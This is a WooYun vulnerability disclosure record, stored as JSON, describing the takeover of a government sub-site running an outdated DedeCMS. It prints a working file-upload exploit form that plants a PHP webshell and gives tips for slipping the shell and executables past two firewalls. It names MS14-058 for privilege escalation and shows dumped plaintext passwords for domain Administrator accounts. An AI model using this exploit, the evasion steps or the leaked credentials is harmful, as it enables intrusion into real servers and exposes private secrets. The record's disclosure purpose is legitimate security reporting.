{"id": 78242, "wybug_id": "wooyun-2015-0160870", "wybug_title": "某人民政府某分站上传漏洞导致服务器沦陷", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-12-18 09:14", "wybug_open_date": "2016-02-01 19:48", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传内容未检查", "文件上传漏洞", "补丁不及时"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-01：\t细节向公众公开  简要描述： 文件上传导致getshell,提权服务器，虽然有两个防火墙，但是都没起作用 详细说明：  http://**.**.**.**/data/admin/ver.txt这个分站用的是个老版本的dedecms，有个上传漏洞\n<html><head><title>Dedecms v55 RCE Exploit Codz By flyh4t</title></head><body xxxxx=\"FONT-SIZE: 9pt\">---------- Dedecms v55 RCE Exploit Codz By flyh4t---------- <br /><br /><form action=http://**.**.**.**/include/dialog/select_soft_post.php method='POST' enctype=\"multipart/form-data\" name='myform'>  <input type='hidden' name='activepath' value='/include/dialog/' />  <input type='hidden' name='cfg_basedir' value='../../' />  <input type='hidden' name='cfg_imgtype' value='jpg' />  <input type='hidden' name='cfg_not_allowall' value='txt' />  <input type='hidden' name='cfg_softtype' value='jpg' />  <input type='hidden' name='cfg_mediatype' value='jpg' />  <input type='hidden' name='f' value='form1.enclosure' />  <input type='hidden' name='job' value='upload' />  <input type='hidden' name='newname' value='xxx.php' />  Select U Shell <input type='file' name='uploadfile' size='25' />  <input type='submit' name='sb1' value='确定' /></form><br />It's just a exp for the bug of Dedecms V55...<br />Need register_globals = on...<br />Fun the game,get a webshell at /uploads/allimg/xxx.php...<br /></body></html>\n对webshell稍微加密一下后缀名保存为jpg就可以上传了，两个防火墙都不拦<img src=\"./upload/201512/12233347700141a52036994f63216a57d7017d2a.png\" alt=\"\" />服务器可以用MS14-058漏洞进行提权，上传可执行pe头文件需要先压缩成zip包，调用PHP的zip_open扩展来解压ZIP包，不然防火墙会拦截\n\n   漏洞证明：  Authentication Package\t\t: NTLM\tkerberos: \t\t  \"Wa@menhu123\"\t(OK)\twdigest: \t\t  \"Wa@menhu123\"\t(OK)\ttspkg :\t\t\t  \"Wa@menhu123\"\t(OK)User Principal\t\t\t: webadmin(Administrator)Domain Authentication\t\t: JDMHAuthentication Package\t\t: NTLM\tkerberos: \t\t  \"Jd@menhu2015\"\t(OK)\twdigest: \t\t  \"Jd@menhu2015\"\t(OK)\ttspkg :\t\t\t  \"Jd@menhu2015\"\t(OK)User Principal\t\t\t: Administrator(Administrator)Domain Authentication\t\t: JDMH   修复方案：  不要光靠防火墙，web应用也得及时升级，清理webshell   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-22 17:59 厂商回复： CNVD确认所述漏洞情况，已经转由CNCERT下发给对应分中心，由其分中心后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}